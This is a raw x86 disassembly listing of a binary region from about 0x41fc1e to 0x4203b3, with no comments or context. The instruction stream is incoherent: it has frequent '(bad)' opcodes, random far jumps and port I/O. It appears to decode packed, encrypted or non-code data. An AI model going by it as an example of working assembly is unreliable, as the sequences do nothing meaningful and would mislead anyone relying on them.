  41fc1e:	outs   dx,DWORD PTR ds:[esi]
  41fc1f:	xchg   edx,eax
  41fc20:	xchg   ebp,eax
  41fc21:	outs   dx,BYTE PTR ds:[esi]
  41fc22:	dec    eax
  41fc23:	inc    esi
  41fc24:	dec    ebp
  41fc25:	fild   DWORD PTR [ebp-0x7b70700]
  41fc2b:	jbe    0x41fc8a
  41fc2d:	fisub  WORD PTR [edi-0x4122942b]
  41fc33:	push   esp
  41fc34:	jmp    0x3456:0xb9cb46b9
  41fc3b:	mov    edx,0x88a64508
  41fc40:	xor    al,0xfe
  41fc42:	push   edi
  41fc43:	je     0x41fc37
  41fc45:	pop    edi
  41fc46:	and    al,0x4d
  41fc48:	aad    0x1f
  41fc4a:	arpl   WORD PTR [esi],bx
  41fc4c:	pushf  
  41fc4d:	and    al,dl
  41fc4f:	cmp    DWORD PTR [ebp-0x29cfabfb],0xffffff9d
  41fc56:	cs cld 
  41fc58:	mov    ch,0x9c
  41fc5a:	je     0x41fc66
  41fc5c:	xor    DWORD PTR [ebp-0x2ff78ba8],0xffffff91
  41fc63:	aaa    
  41fc64:	sar    cl,0x4
  41fc67:	enter  0xd9b9,0xd6
  41fc6b:	inc    edi
  41fc6c:	imul   edi,DWORD PTR [ebp-0x65],0xdae941b5
  41fc73:	cli    
  41fc74:	lock ins DWORD PTR es:[edi],dx
  41fc76:	arpl   WORD PTR ds:0xa25780b9,sp
  41fc7c:	popf   
  41fc7d:	or     BYTE PTR [eax-0x78f889b9],al
  41fc83:	pop    esi
  41fc84:	test   bl,0xe7
  41fc87:	sub    ecx,DWORD PTR [ebx-0x18]
  41fc8a:	sar    DWORD PTR [ecx-0x36],cl
  41fc8d:	data16 adc BYTE PTR [ebx],al
  41fc90:	into   
  41fc91:	add    BYTE PTR [ebp+0x2c4c0686],bh
  41fc97:	stos   BYTE PTR es:[edi],al
  41fc98:	inc    ebx
  41fc99:	test   DWORD PTR [eax],ecx
  41fc9b:	xchg   DWORD PTR [ecx],ebx
  41fc9d:	test   DWORD PTR ds:0x3e6eeea,eax
  41fca3:	call   0x8b18:0x81d80415
  41fcaa:	sub    cl,0x8a
  41fcad:	mov    eax,ds:0x7b60c43f
  41fcb2:	test   DWORD PTR [ebx-0x39a0cc27],edx
  41fcb8:	mov    eax,0x2ebe1115
  41fcbd:	popa   
  41fcbe:	fadd   DWORD PTR [edi-0x39]
  41fcc1:	push   cs
  41fcc2:	adc    DWORD PTR [edi],ecx
  41fcc4:	retf   
  41fcc5:	dec    esp
  41fcc6:	mov    BYTE PTR [ecx+0x22d48d55],dh
  41fccc:	ins    BYTE PTR es:[edi],dx
  41fccd:	cs rcl eax,0xcd
  41fcd1:	pop    ebx
  41fcd2:	cmp    al,0xe9
  41fcd4:	inc    esp
  41fcd5:	loop   0x41fd2e
  41fcd7:	sahf   
  41fcd8:	fcom   DWORD PTR [ebx+0x34]
  41fcdb:	jmp    0x41fc61
  41fcdd:	adc    cl,dh
  41fcdf:	and    DWORD PTR [ebp-0x7a9a08ad],0x5986ff64
  41fce9:	jbe    0x41fcef
  41fceb:	cmp    al,0x22
  41fced:	popf   
  41fcee:	out    dx,al
  41fcef:	adc    dl,BYTE PTR ds:0x94bfa18
  41fcf5:	mov    ebp,0x59b79ce1
  41fcfa:	rcl    edx,cl
  41fcfc:	inc    edx
  41fcfd:	jl     0x41fd76
  41fcff:	add    ch,dl
  41fd01:	leave  
  41fd02:	push   ebp
  41fd03:	enter  0x94d5,0xaf
  41fd07:	dec    edi
  41fd08:	cmc    
  41fd09:	pushf  
  41fd0a:	mov    cl,bl
  41fd0c:	add    dl,bh
  41fd0e:	(bad)  [edx]
  41fd10:	rol    DWORD PTR [ecx],1
  41fd12:	pop    eax
  41fd13:	jecxz  0x41fc99
  41fd15:	shr    al,1
  41fd17:	jae    0x41fcc5
  41fd19:	(bad)  
  41fd1b:	mov    ebp,0xe8171f31
  41fd20:	inc    ebx
  41fd21:	xchg   DWORD PTR [edi-0x3a4aaf1f],esi
  41fd27:	arpl   dx,ax
  41fd29:	out    0x52,al
  41fd2b:	xchg   ebx,ebp
  41fd2d:	pop    edi
  41fd2e:	pop    ds
  41fd2f:	jecxz  0x41fd90
  41fd31:	and    al,0x2f
  41fd33:	inc    ebp
  41fd34:	pop    ds
  41fd35:	pop    ebx
  41fd36:	xchg   BYTE PTR [edi],bh
  41fd38:	xchg   edi,eax
  41fd39:	mov    ebp,0x2dae4de7
  41fd3e:	aad    0xbb
  41fd40:	dec    edi
  41fd41:	imul   esp,DWORD PTR [edi],0xffffffce
  41fd44:	fisttp WORD PTR [edi+esi*2]
  41fd47:	push   edx
  41fd48:	adc    DWORD PTR [esi],edx
  41fd4a:	cmp    bh,BYTE PTR [ebx+0x39]
  41fd4d:	aad    0xc6
  41fd4f:	lds    esi,FWORD PTR [esp+esi*2]
  41fd52:	inc    esi
  41fd53:	test   eax,0xd18b2c2
  41fd58:	std    
  41fd59:	popf   
  41fd5a:	push   0x7a
  41fd5c:	lea    esp,[edi]
  41fd5e:	std    
  41fd5f:	sbb    al,0xe9
  41fd61:	sub    al,0xe1
  41fd63:	push   edx
  41fd64:	ss xor dl,0x64
  41fd68:	mov    dl,0x7
  41fd6a:	in     eax,dx
  41fd6b:	mov    esi,0x9a64bd75
  41fd70:	jne    0x41fda1
  41fd72:	(bad)  
  41fd73:	loopne 0x41fddd
  41fd75:	xchg   BYTE PTR [edi-0x6a5aa416],bh
  41fd7b:	xor    bh,dh
  41fd7d:	mov    cl,0x1e
  41fd7f:	scas   al,BYTE PTR es:[edi]
  41fd80:	loop   0x41fd0a
  41fd82:	ss in  al,0x8a
  41fd85:	scas   al,BYTE PTR es:[edi]
  41fd86:	or     eax,0x3c75c4fc
  41fd8b:	(bad)  
  41fd8c:	gs nop
  41fd8e:	mov    esp,0x4c9cbf83
  41fd93:	jb     0x41fdd9
  41fd95:	out    dx,al
  41fd96:	repz sbb al,0xb1
  41fd99:	fsub   QWORD PTR [ecx+0x58d6f386]
  41fd9f:	icebp  
  41fda0:	push   eax
  41fda1:	popa   
  41fda2:	add    edi,edx
  41fda4:	xor    DWORD PTR [ecx],esp
  41fda6:	out    dx,eax
  41fda7:	jo     0x41fd6e
  41fda9:	jge    0x41fd62
  41fdab:	sub    DWORD PTR [ebx+0x778db249],esp
  41fdb1:	pop    ss
  41fdb2:	xchg   ebp,eax
  41fdb3:	outs   dx,DWORD PTR ds:[esi]
  41fdb4:	mov    edx,DWORD PTR [esi]
  41fdb6:	sbb    al,0x1e
  41fdb8:	push   edi
  41fdb9:	cmp    BYTE PTR [ecx],al
  41fdbb:	pop    eax
  41fdbc:	push   esi
  41fdbd:	test   DWORD PTR [edi-0x590ebbe4],ebx
  41fdc3:	or     DWORD PTR [eax-0x42],eax
  41fdc6:	dec    esp
  41fdc7:	cdq    
  41fdc8:	je     0x41fe17
  41fdca:	or     al,0xc5
  41fdcc:	ins    DWORD PTR es:[edi],dx
  41fdcd:	test   BYTE PTR [ebx],bh
  41fdcf:	fwait
  41fdd0:	mov    DWORD PTR [edi-0x2],0x231f0a52
  41fdd7:	ds (bad) 
  41fdd9:	pop    eax
  41fdda:	or     ah,BYTE PTR [ebx+0x7c477947]
  41fde0:	sar    DWORD PTR [esi-0x798ac93b],cl
  41fde6:	pop    ss
  41fde7:	psubusw mm1,mm4
  41fdea:	sub    DWORD PTR [ecx+esi*1+0xe],ebx
  41fdee:	jbe    0x41fda7
  41fdf0:	(bad)  [esi]
  41fdf2:	mov    cl,BYTE PTR [edi]
  41fdf4:	and    ch,BYTE PTR [edx]
  41fdf6:	mov    al,0xf6
  41fdf8:	aam    0x8f
  41fdfa:	sbb    al,0x2a
  41fdfc:	xchg   edx,eax
  41fdfd:	retf   0xdfd8
  41fe00:	jb     0x41fdce
  41fe02:	sub    eax,0xbc96511e
  41fe07:	mov    DWORD PTR [ecx-0xa],esi
  41fe0a:	add    edx,DWORD PTR [edi+ebp*8+0x65]
  41fe0e:	or     ecx,DWORD PTR [eax+eiz*2]
  41fe11:	xchg   esi,eax
  41fe12:	loopne 0x41fe4a
  41fe14:	mov    ebp,0x26211753
  41fe19:	cmp    al,0x7e
  41fe1b:	imul   ebx,DWORD PTR [esi],0xffffffee
  41fe1e:	push   esp
  41fe1f:	xor    eax,DWORD PTR [eax]
  41fe21:	push   edx
  41fe22:	out    dx,al
  41fe23:	out    dx,al
  41fe24:	mov    BYTE PTR [esi+0x2a756659],cl
  41fe2a:	ret    0xdd8f
  41fe2d:	dec    esp
  41fe2e:	xchg   esi,eax
  41fe2f:	or     BYTE PTR [ebx+0x16215ba6],al
  41fe35:	retf   0x3daa
  41fe38:	mov    al,0x88
  41fe3a:	mov    ch,0x7e
  41fe3c:	and    BYTE PTR ds:0x2a7a,ah
  41fe41:	lock aad 0xcc
  41fe44:	fidivr DWORD PTR [edx]
  41fe46:	fs out 0xcf,al
  41fe49:	inc    ebp
  41fe4a:	sbb    eax,0xdf1da056
  41fe4f:	mov    ch,0x44
  41fe51:	ss sub eax,0xc6930e82
  41fe57:	aad    0x8e
  41fe59:	sbb    BYTE PTR [edi],dh
  41fe5b:	mov    ch,0xfa
  41fe5d:	mov    al,BYTE PTR [ecx]
  41fe5f:	cmc    
  41fe60:	sbb    al,BYTE PTR [eax-0x2dcf9ca0]
  41fe66:	push   ebp
  41fe67:	rol    DWORD PTR [edi-0x693f9793],cl
  41fe6d:	fwait
  41fe6e:	aam    0x77
  41fe70:	sub    eax,DWORD PTR [ebx+edi*2+0x3e]
  41fe74:	mov    ch,0xea
  41fe76:	pop    ebp
  41fe77:	pop    ecx
  41fe78:	ins    BYTE PTR es:[edi],dx
  41fe79:	push   ds
  41fe7a:	cmp    DWORD PTR [eax],ecx
  41fe7c:	bound  ebx,QWORD PTR [edx+0x51]
  41fe7f:	mov    ebx,0xa46e039e
  41fe84:	ror    bh,0x46
  41fe87:	jnp    0x41fe9d
  41fe89:	dec    eax
  41fe8a:	mov    ch,0x57
  41fe8c:	jg     0x41fe6b
  41fe8e:	repnz sbb ah,BYTE PTR [edx-0x12]
  41fe92:	sub    eax,0x11a0cd
  41fe97:	gs xor esp,esi
  41fe9a:	(bad)  
  41fe9b:	(bad)  
  41fe9c:	cli    
  41fe9d:	xlat   BYTE PTR ds:[ebx]
  41fe9e:	test   al,0x1
  41fea0:	mov    ah,0x49
  41fea2:	adc    bh,BYTE PTR [ecx]
  41fea4:	scas   eax,DWORD PTR es:[edi]
  41fea5:	cmp    eax,0xd49ae676
  41feaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41feab:	popa   
  41feac:	idiv   BYTE PTR [esi]
  41feae:	test   al,ch
  41feb0:	cmp    BYTE PTR [edx+eax*2-0x4b914199],bh
  41feb7:	sub    al,0x5b
  41feb9:	(bad)  [esi+0x3defae0a]
  41febf:	dec    edi
  41fec0:	cmc    
  41fec1:	adc    al,0x10
  41fec3:	popa   
  41fec4:	fcmovnu st,st(4)
  41fec6:	push   ds
  41fec7:	mov    ecx,0xe0cbef3c
  41fecc:	push   eax
  41fecd:	ret    
  41fece:	add    bl,ah
  41fed0:	dec    esi
  41fed1:	das    
  41fed2:	and    eax,0xc980f9ef
  41fed7:	les    eax,FWORD PTR [esi-0x35]
  41feda:	push   edx
  41fedb:	fwait
  41fedc:	xchg   ecx,eax
  41fedd:	outs   dx,BYTE PTR ds:[esi]
  41fede:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fedf:	fcomp  QWORD PTR [esi-0x54d6346f]
  41fee5:	xchg   ebx,eax
  41fee6:	(bad)  
  41fee8:	out    0xd5,eax
  41feea:	lds    ecx,FWORD PTR [edx+0x285642a0]
  41fef0:	shr    BYTE PTR [ebx+0x6e],0xbf
  41fef4:	xchg   ecx,eax
  41fef5:	push   0x748ab5a7
  41fefa:	inc    esp
  41fefb:	push   ebp
  41fefc:	xchg   BYTE PTR [ebp+0x429c6b90],dl
  41ff02:	pop    ss
  41ff03:	sub    BYTE PTR [ecx+edx*8-0x7a],al
  41ff07:	add    ch,BYTE PTR [edi+0x39]
  41ff0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff0b:	dec    edi
  41ff0c:	data16 sub bl,BYTE PTR [edi-0x5edf13]
  41ff13:	sbb    eax,0x34468221
  41ff18:	mov    WORD PTR [edx+eiz*4],fs
  41ff1b:	dec    edx
  41ff1c:	mov    edx,0xe69a3574
  41ff21:	push   esp
  41ff22:	loope  0x41ffa0
  41ff24:	or     dh,cl
  41ff26:	fisubr DWORD PTR [esi+0x268d6d48]
  41ff2c:	cmp    eax,DWORD PTR [ecx-0x10e101f0]
  41ff32:	out    0x61,eax
  41ff34:	in     eax,0x5a
  41ff36:	sti    
  41ff37:	les    esi,FWORD PTR [ebp+0x27b4d7e5]
  41ff3d:	sahf   
  41ff3e:	retf   
  41ff3f:	add    BYTE PTR [edx+0x5e2653b],0xbf
  41ff46:	push   es
  41ff47:	ficomp WORD PTR [eax-0x1996aeaa]
  41ff4d:	sub    edx,DWORD PTR [ecx+esi*4+0x3ae93134]
  41ff54:	lods   eax,DWORD PTR ds:[esi]
  41ff55:	mov    ah,0xb
  41ff57:	jo     0x41ff33
  41ff59:	ja     0x41ff3a
  41ff5b:	jmp    0x1e6df9c7
  41ff60:	dec    edi
  41ff61:	loop   0x41fef5
  41ff63:	test   DWORD PTR [ecx-0x2676935d],0x870f51
  41ff6d:	inc    ebx
  41ff6e:	test   DWORD PTR [edi-0x28ae4f62],esi
  41ff74:	sub    ebx,ebx
  41ff76:	mov    bl,0xb
  41ff78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff79:	xchg   ebp,eax
  41ff7a:	mov    edx,0xe55df927
  41ff7f:	xor    eax,0xb5da65e3
  41ff84:	jbe    0x41ff5f
  41ff86:	cmp    eax,0x631ce22f
  41ff8b:	jmp    0x41ff1b
  41ff8d:	jle    0x41ffc1
  41ff8f:	in     al,dx
  41ff90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff91:	xchg   edi,eax
  41ff92:	jae    0x41ff39
  41ff94:	mov    bh,0x85
  41ff96:	xor    al,0x93
  41ff98:	inc    esp
  41ff99:	push   ds
  41ff9a:	push   edi
  41ff9b:	jmp    FWORD PTR [esi+0x2617b24c]
  41ffa1:	clc    
  41ffa2:	mov    ds:0xbbee3152,al
  41ffa7:	repz sub eax,0x76b121db
  41ffad:	ret    
  41ffae:	loope  0x41ffb8
  41ffb0:	leave  
  41ffb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ffb2:	push   ss
  41ffb3:	pop    ebp
  41ffb4:	icebp  
  41ffb5:	and    ebp,ecx
  41ffb7:	fstp   DWORD PTR [esi+ecx*4]
  41ffba:	pop    ds
  41ffbb:	mov    ebp,0xdbc33128
  41ffc0:	cmp    DWORD PTR [edx],ebp
  41ffc2:	cmp    BYTE PTR [eax-0x14574e32],dh
  41ffc8:	jno    0x41ff8f
  41ffca:	loop   0x42002d
  41ffcc:	dec    ebp
  41ffcd:	(bad)  
  41ffce:	(bad)  
  41ffd0:	lea    edi,[ecx+0x34d8c303]
  41ffd6:	add    dh,dl
  41ffd8:	xchg   edx,eax
  41ffd9:	mov    ebx,DWORD PTR [edi+edx*1-0x7c79185a]
  41ffe0:	int    0x97
  41ffe2:	mov    bl,0x3f
  41ffe4:	(bad)  
  41ffe5:	aad    0xe6
  41ffe7:	jmp    0x41ffad
  41ffe9:	ins    DWORD PTR es:[edi],dx
  41ffea:	inc    esp
  41ffeb:	pop    ds
  41ffec:	jle    0x420026
  41ffee:	ja     0x41ff78
  41fff0:	cmp    al,0x8e
  41fff2:	repnz enter 0x3406,0xa6
  41fff7:	fisub  WORD PTR [edx]
  41fff9:	stc    
  41fffa:	aad    0xe6
  41fffc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fffd:	js     0x420001
  41ffff:	xor    bl,dl
  420001:	pop    esi
  420002:	jle    0x41fff4
  420004:	sbb    BYTE PTR [ebx-0x4f],ah
  420007:	fsub   st,st(2)
  420009:	mov    esi,DWORD PTR [eax-0x76]
  42000c:	pop    es
  42000d:	cmp    eax,0x2ec0e464
  420012:	rcr    DWORD PTR [edi+0x61],1
  420015:	sahf   
  420016:	sub    ch,BYTE PTR [esi]
  420018:	push   es
  420019:	iret   
  42001a:	xchg   esp,eax
  42001b:	hlt    
  42001c:	jp     0x41ffaa
  42001e:	test   al,0x6e
  420020:	mov    al,ds:0x95f81790
  420025:	mov    cl,0x88
  420027:	add    BYTE PTR [edx+0x7b],dl
  42002a:	ret    
  42002b:	pop    ebx
  42002c:	in     al,dx
  42002d:	or     ch,BYTE PTR [esi+eiz*8-0x5e]
  420031:	in     al,0x1d
  420033:	xor    BYTE PTR [ebp+edi*8+0x47],0x8a
  420038:	xor    BYTE PTR [esi-0x2d83acda],ah
  42003e:	sub    ch,dh
  420040:	stos   BYTE PTR es:[edi],al
  420041:	xchg   ecx,eax
  420042:	rol    BYTE PTR [ebx-0x5f],1
  420045:	mov    WORD PTR [ebp-0x4bdfe954],fs
  42004b:	sbb    edx,DWORD PTR ds:0x61181549
  420051:	mov    esp,db1
  420054:	outs   dx,DWORD PTR ds:[esi]
  420055:	jno    0x420070
  420057:	push   cs
  420058:	push   eax
  420059:	pop    ss
  42005a:	sbb    cl,bl
  42005c:	mov    al,0x87
  42005e:	or     cl,BYTE PTR [ecx-0x46505503]
  420064:	xor    ah,dl
  420066:	push   0xfffffffe
  420068:	call   0xd56b:0x297cd9d3
  42006f:	lods   al,BYTE PTR ds:[esi]
  420070:	mov    dh,0x1b
  420072:	dec    edx
  420073:	pusha  
  420074:	xchg   esp,eax
  420075:	push   ebx
  420076:	rcl    BYTE PTR [ebp+0x2926bdc9],cl
  42007c:	push   ecx
  42007d:	pop    es
  42007e:	push   eax
  42007f:	shr    BYTE PTR ss:[esi+0x3c],cl
  420083:	mov    edi,ds
  420085:	jae    0x420012
  420087:	xchg   esi,eax
  420088:	(bad)  
  420089:	pop    ebx
  42008a:	inc    DWORD PTR [edx]
  42008c:	or     BYTE PTR ds:0xf5571f4b,ah
  420092:	fsubp  st(6),st
  420094:	adc    al,0x49
  420096:	mov    dl,0xd9
  420098:	cmp    eax,0x487b467d
  42009d:	xchg   ebx,eax
  42009e:	lahf   
  42009f:	cwde   
  4200a0:	push   ebp
  4200a1:	jmp    0x9326:0xdc436363
  4200a8:	and    eax,0xb9fe85f8
  4200ad:	xor    esi,0xffffff9e
  4200b0:	adc    eax,0x4c0294a1
  4200b5:	pushf  
  4200b6:	lock push edi
  4200b8:	sub    BYTE PTR [esi+0x61],0x30
  4200bc:	mov    bl,BYTE PTR [edi+0x7e]
  4200bf:	mov    edi,0x5fe3d705
  4200c4:	hlt    
  4200c5:	stos   BYTE PTR es:[edi],al
  4200c6:	js     0x420139
  4200c8:	rol    BYTE PTR [esi+0x8],cl
  4200cb:	add    ebp,ebx
  4200cd:	pop    ecx
  4200ce:	mov    dh,0xe0
  4200d0:	scas   al,BYTE PTR es:[edi]
  4200d1:	ss push esp
  4200d3:	cdq    
  4200d4:	inc    esp
  4200d5:	fsubr  st,st(5)
  4200d7:	dec    ecx
  4200d8:	dec    edx
  4200d9:	sbb    eax,0x56d085b4
  4200de:	xlat   BYTE PTR ds:[ebx]
  4200df:	arpl   di,di
  4200e1:	aad    0x93
  4200e3:	pushf  
  4200e4:	pop    es
  4200e5:	div    BYTE PTR [edx]
  4200e7:	fst    DWORD PTR [edi]
  4200e9:	test   esp,esi
  4200eb:	imul   ebx,eax,0xffffffcb
  4200ee:	sbb    edx,edi
  4200f0:	mov    gs,WORD PTR [ebp+0x7611d3f4]
  4200f6:	retf   
  4200f7:	pop    ecx
  4200f8:	xchg   esi,eax
  4200f9:	add    al,0x36
  4200fb:	outs   dx,BYTE PTR ds:[esi]
  4200fc:	mov    ebx,0x507d9c25
  420101:	loope  0x420102
  420103:	sub    dl,BYTE PTR [ecx+0x423a3358]
  420109:	ret    0x5d76
  42010c:	into   
  42010d:	cs pop esi
  42010f:	mov    DWORD PTR [edi+0x9],0x90b73519
  420116:	inc    esp
  420117:	and    edx,DWORD PTR [esi+0x4a0c4b1c]
  42011d:	retf   
  42011e:	mov    ebx,0x1c47a7a3
  420123:	push   ds
  420124:	xchg   BYTE PTR [esi-0x2721dcce],ah
  42012a:	dec    esi
  42012b:	xor    bh,BYTE PTR [edi]
  42012d:	sbb    bl,BYTE PTR [edi]
  42012f:	add    BYTE PTR ds:0x563d8767,0x4e
  420136:	loopne 0x420119
  420138:	fmul   QWORD PTR [edx-0x58]
  42013b:	push   esp
  42013c:	(bad)  
  42013d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42013e:	cwde   
  42013f:	inc    ecx
  420140:	pop    ebx
  420141:	inc    ecx
  420142:	mov    dl,0x1b
  420144:	mov    esp,0x3608860c
  420149:	dec    ebx
  42014a:	pop    ebx
  42014b:	je     0x420187
  42014d:	fldcw  WORD PTR [edi]
  42014f:	jmp    0xd212:0x64bffdc
  420156:	cmp    DWORD PTR [eax-0x1e7db855],0xffffffa5
  42015d:	shr    DWORD PTR [ebx-0xc5b826b],1
  420163:	mov    esp,0x1aa064d5
  420168:	retf   0xfa5f
  42016b:	mov    ds:0xd14e5277,eax
  420170:	mov    ch,0x97
  420172:	imul   edi,DWORD PTR [edx+ebx*4],0xfffffff6
  420176:	add    eax,0x77d9b390
  42017b:	loopne 0x4201bb
  42017d:	pop    edi
  42017e:	hlt    
  42017f:	push   edx
  420180:	mov    ch,0x8a
  420182:	sbb    esi,esi
  420184:	mov    ch,0x83
  420186:	and    ebp,ebp
  420188:	xor    ch,dh
  42018a:	clc    
  42018b:	jno    0x420181
  42018d:	xlat   BYTE PTR ds:[ebx]
  42018e:	nop
  42018f:	xor    ah,dh
  420191:	fisub  WORD PTR [esi]
  420193:	sub    esp,esp
  420195:	pop    ss
  420196:	xor    ebx,edx
  420198:	inc    edi
  420199:	add    esi,eax
  42019b:	fisttp DWORD PTR [eax-0x65713abe]
  4201a1:	gs stos DWORD PTR es:[edi],eax
  4201a3:	in     al,dx
  4201a4:	sub    DWORD PTR [ebx-0x78],0xe5a5e487
  4201ab:	xchg   edi,eax
  4201ac:	neg    BYTE PTR [ebx]
  4201ae:	call   0x19334662
  4201b3:	mov    bl,BYTE PTR [ebx+0x5c5ddafa]
  4201b9:	repz frstor [edi]
  4201bc:	aam    0x53
  4201be:	mov    ebx,DWORD PTR [esi]
  4201c0:	int    0xb8
  4201c2:	mov    edi,0x7df3361a
  4201c7:	loop   0x4201b7
  4201c9:	and    al,0x7f
  4201cb:	call   0x9ae06716
  4201d0:	mov    eax,0x1c73cc56
  4201d5:	add    al,0x44
  4201d7:	arpl   WORD PTR [esi],sp
  4201d9:	sbb    BYTE PTR [ebp+0x4b],cl
  4201dc:	sbb    BYTE PTR ds:0x4f63b380,bl
  4201e2:	and    ebx,eax
  4201e4:	push   edi
  4201e5:	push   edx
  4201e6:	cli    
  4201e7:	mov    WORD PTR [esi],fs
  4201e9:	cmp    DWORD PTR [ebx],eax
  4201eb:	gs pop ebp
  4201ed:	addr16 inc edi
  4201ef:	cmp    DWORD PTR ds:0xfd28f230,ecx
  4201f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201f6:	cdq    
  4201f7:	ins    BYTE PTR es:[edi],dx
  4201f8:	stc    
  4201f9:	in     al,0x3c
  4201fb:	mov    esp,0xd571760f
  420200:	mov    bl,0x35
  420202:	lods   eax,DWORD PTR ds:[esi]
  420203:	jge    0x420254
  420205:	popf   
  420206:	bswap  ecx
  420208:	mov    ah,0x4a
  42020a:	aam    0x5
  42020c:	out    0x4f,al
  42020e:	iret   
  42020f:	fadd   st,st(6)
  420211:	push   ds
  420212:	(bad)  
  420213:	sti    
  420214:	sub    bh,BYTE PTR [edx-0x2c]
  420217:	(bad)  
  420218:	push   ds
  420219:	xlat   BYTE PTR ds:[ebx]
  42021a:	xor    eax,0xc901f671
  42021f:	or     eax,0xe8e65026
  420224:	in     eax,dx
  420225:	data16 in al,0x70
  420228:	push   esi
  420229:	dec    ecx
  42022a:	pop    ds
  42022b:	push   cs
  42022c:	das    
  42022d:	sub    eax,0x63689037
  420232:	jge    0x42026c
  420234:	popf   
  420235:	out    0x4,al
  420237:	popf   
  420238:	mov    ch,0x69
  42023a:	nop
  42023b:	jno    0x420260
  42023d:	xor    dh,dh
  42023f:	add    BYTE PTR [esi-0x57607ab4],bl
  420245:	inc    edx
  420246:	mov    ch,0x97
  420248:	sysenter 
  42024a:	das    
  42024b:	jne    0x420257
  42024d:	sar    BYTE PTR [eax-0x5e3d1d55],1
  420253:	and    ebp,DWORD PTR [edx+0x27a5e41d]
  420259:	adc    ebp,DWORD PTR [edi]
  42025b:	push   ecx
  42025c:	pushf  
  42025d:	(bad)  
  42025e:	cmc    
  42025f:	stc    
  420260:	add    dl,ch
  420262:	xchg   esi,eax
  420263:	pop    ecx
  420264:	and    al,0xb1
  420266:	pop    edx
  420267:	mov    WORD PTR [edx-0x7f],?
  42026a:	es mov ah,BYTE PTR fs:[eax-0xfc8f610]
  420272:	inc    esp
  420273:	mov    eax,0x5116271a
  420278:	test   eax,0xd459dd8d
  42027d:	addr16 pop ecx
  42027f:	mov    ebp,0x4b7135aa
  420284:	ins    BYTE PTR es:[edi],dx
  420285:	lock cdq 
  420287:	ret    
  420288:	cmp    BYTE PTR [esi-0x73],0xe5
  42028c:	add    DWORD PTR [esi],0xffffff8a
  42028f:	ds clc 
  420291:	jb     0x4202f1
  420293:	or     eax,edi
  420295:	or     eax,0x6bf44e94
  42029a:	inc    edx
  42029b:	(bad)  
  42029c:	icebp  
  42029d:	test   BYTE PTR [edx-0xc],dl
  4202a0:	dec    ebp
  4202a1:	mov    dh,BYTE PTR [esi+0x14]
  4202a4:	inc    BYTE PTR [edx-0xf443e9f]
  4202aa:	sub    BYTE PTR ds:0x97b81e36,0x48
  4202b1:	jb     0x4202d8
  4202b3:	adc    eax,0xdca61905
  4202b8:	jge    0x4202d1
  4202ba:	or     BYTE PTR [eax],bh
  4202bc:	xor    eax,0x5f6e5932
  4202c1:	pop    esp
  4202c2:	add    esp,DWORD PTR [edi+ecx*1-0x2f]
  4202c6:	dec    eax
  4202c7:	and    DWORD PTR [ebp+0x73a12207],0x69d43111
  4202d1:	xor    esp,ecx
  4202d3:	call   0x892:0x76c5d82b
  4202da:	test   eax,0x722a4cb2
  4202df:	scas   al,BYTE PTR es:[edi]
  4202e0:	mov    BYTE PTR [eax-0x7e],al
  4202e3:	(bad)  
  4202e4:	aad    0x0
  4202e6:	cmc    
  4202e7:	sub    ecx,DWORD PTR [ebp-0x6]
  4202ea:	cwde   
  4202eb:	mov    dl,0x78
  4202ed:	ds jl  0x420273
  4202f0:	mov    WORD PTR [ebx+0x6f],?
  4202f3:	jmp    0xb0f0:0xa3585587
  4202fa:	in     al,dx
  4202fb:	sbb    ebp,DWORD PTR [eax]
  4202fd:	iret   
  4202fe:	arpl   di,ax
  420300:	push   esi
  420301:	xchg   ecx,eax
  420302:	xchg   edx,eax
  420303:	pop    ebp
  420304:	cli    
  420305:	imul   edx,DWORD PTR ds:0xfb434d65,0x28
  42030c:	in     al,0x13
  42030e:	fdivr  st(2),st
  420310:	loop   0x4202b5
  420312:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420313:	xor    eax,edi
  420315:	mov    ebp,0x50483d8d
  42031a:	pop    esi
  42031b:	inc    eax
  42031c:	pop    ds
  42031d:	push   ss
  42031e:	xchg   ebx,eax
  42031f:	push   ebp
  420320:	jg     0x42030c
  420322:	pop    eax
  420323:	sub    DWORD PTR [ebp+0x57],0xffffffc4
  420327:	loop   0x4202d7
  420329:	fucomp st(5)
  42032b:	xor    eax,0xf89b1062
  420330:	add    esi,esp
  420332:	in     eax,0x2
  420334:	sub    ebx,DWORD PTR [eax+0x18]
  420337:	jbe    0x420308
  420339:	leave  
  42033a:	outs   dx,DWORD PTR ds:[esi]
  42033b:	stos   DWORD PTR es:[di],eax
  42033d:	mov    ecx,ebx
  42033f:	enter  0x8106,0x59
  420343:	sub    cl,BYTE PTR ds:[esi-0x14879f17]
  42034a:	adc    cl,dh
  42034c:	push   eax
  42034d:	adc    eax,0x3b83b7b8
  420352:	push   ecx
  420353:	mov    eax,0xb6e470b8
  420358:	pop    esp
  420359:	in     al,0x31
  42035b:	mov    dl,0xe2
  42035d:	push   esp
  42035e:	cmp    edx,edi
  420360:	dec    eax
  420361:	mov    al,es:0x7d6173b9
  420367:	fsub   QWORD PTR [ecx+ebp*4+0x24]
  42036b:	loopne 0x420395
  42036d:	stc    
  42036e:	xor    bl,BYTE PTR [edx+0x292e6f40]
  420374:	ror    BYTE PTR [eax+edi*8],1
  420377:	and    eax,0x58c2b272
  42037c:	xchg   ecx,eax
  42037d:	pushf  
  42037e:	inc    esi
  42037f:	call   0x38c2:0x8b73caa1
  420386:	add    ebp,ecx
  420388:	pop    ecx
  420389:	inc    ebx
  42038a:	push   esi
  42038b:	enter  0xb277,0x6d
  42038f:	mov    ch,0x84
  420391:	imul   esi,DWORD PTR [ebp+0x59],0x5e0b18cb
  420398:	fstp   st(0)
  42039a:	pop    ebp
  42039b:	mov    DWORD PTR [ecx-0x5bedba91],ebx
  4203a1:	fadd   st,st(3)
  4203a3:	xchg   DWORD PTR [eax+edx*1+0x72],edi
  4203a7:	repnz sbb al,0x3d
  4203aa:	add    al,0x3a
  4203ac:	inc    ecx
  4203ad:	mov    WORD PTR [edi+0x1f],cs
  4203b0:	pop    edx
  4203b1:	sub    al,0x48
  4203b3:	dec    esi
